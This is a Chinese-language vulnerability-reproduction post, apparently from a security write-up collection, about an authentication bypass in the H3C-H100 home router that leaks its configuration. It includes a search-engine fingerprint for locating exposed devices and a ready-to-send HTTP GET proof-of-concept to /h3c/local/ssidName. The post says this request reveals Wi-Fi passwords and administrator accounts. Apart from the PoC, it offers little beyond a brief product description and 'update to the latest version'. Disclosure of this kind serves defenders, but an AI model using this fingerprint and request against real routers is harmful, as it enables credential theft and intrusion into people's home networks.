#  H3C-H100路由器敏感信息泄露漏洞 附POC  
安服仔
                    安服仔  北风漏洞复现文库   2026-03-09 03:11  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
# H3C-H100路由器敏感信息泄露漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0XntdegibXBnKd9zFoEI74Iamw4ZUW5qSkcWA8SZ1MIWvBPJQZ2eE1ibUibR6Rbrt1SmkURQibvZdZvNhEKiblVbHOQUcxg5z5n6Ig/640?wx_fmt=png&from=appmsg "")  
  
****  
  
03  
  
—  
  
漏洞简介  
  
H3C-H100路由器是新华三技术有限公司推出的全千兆家庭智能  
中枢，专为家庭用户设计，尤其适  
合大户型、别墅或结构复杂的住宅环  
境。它集**路由、****无线管理（AC）、PoE供电**  
三大功能于一  
体，可统一管理H3C Magic A系列无线面板AP，实现全屋Wi-Fi无死角覆盖。  
攻击者通过构造特殊路径（如/h3c/local/ssidname  
），绕过身份验证，直接读取路由器配置文件，获取Wi-Fi密码、管理账号等敏感信息。  
  
04  
  
—  
  
资产测绘  
```
body="/grwizard/h3c.ico"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0RrP9oG03GAnB6JWp7exWsibJeGhEFJOdcbaPmQCjCR4I4x7PFMHY6O8qXeG2WroAiaNw29mXRqxicbUto1Sja6AygFWDKFkYUyU/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /h3c/local/ssidName HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3ro5QsprTvibK5e2NfuYmmF5clLrIqPAlVqUaprAmjNSiaj2VFoRJo5xdfYkJ3NJXGHp0pfrtj1C1Vu7I6zSicuqic4jaDsvTagQo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2fyjpZIojKQNiaUIHepFASswK9vDmxqWTtXOuBdfoo5lPkibibQ6w5M7CkYfLEtMt7QsERXZOcTqUY5TxXqu7fcficBtHaicyiaBN1Y/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
更新至最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
